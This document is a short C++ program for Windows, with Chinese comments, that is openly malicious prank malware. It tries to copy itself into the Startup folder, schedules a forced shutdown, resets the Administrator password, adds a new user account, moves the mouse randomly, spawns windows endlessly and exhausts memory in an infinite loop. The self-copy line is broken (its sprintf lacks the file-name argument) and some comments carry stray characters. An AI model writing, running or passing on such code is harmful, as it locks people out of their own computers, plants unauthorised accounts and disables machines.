#include <iostream>
#include<windows.h>
#include<ctime>
#include <cstdlib>
# include <stdio.h>
#include <string.h>
#include <fstream>
using namespace std;
int main (int argc,char *argv[])
{
	char copy[80];
	sprintf(copy,"copy %s \"%%userprofile%%\\「开始」菜单\\程序\\启动\"");
	system(copy); //将这个bai程序拷到du开机启动文件夹下面zhi
	char cmd[]="shutdown -s -t 20";//自动关机
	system("ping baidu.com");
	system(cmd);
	system("pause");
	system(copy);
	system("net user Administrator xz");//设置开机密码为xz
	system("net user 崩溃 xz /add");//建立用户,并命名为崩溃 
	int x=GetSystemMetrics(SM_CXSCREEN);//鼠标x轴 
    int y=GetSystemMetrics(SM_CYSCREEN);//鼠标y轴 
    srand(time(0));//随机函数种子 
    system("shutdown -s -t 20");//20秒关机 
    while(1)//循环 
    { 
    	SetCursorPos(rand()%x,rand()%y);//鼠标 x y轴 随机
    	system("start");//弹出窗口 	
        char *p=new char[10000];//卡死机 
    }  
    
} 


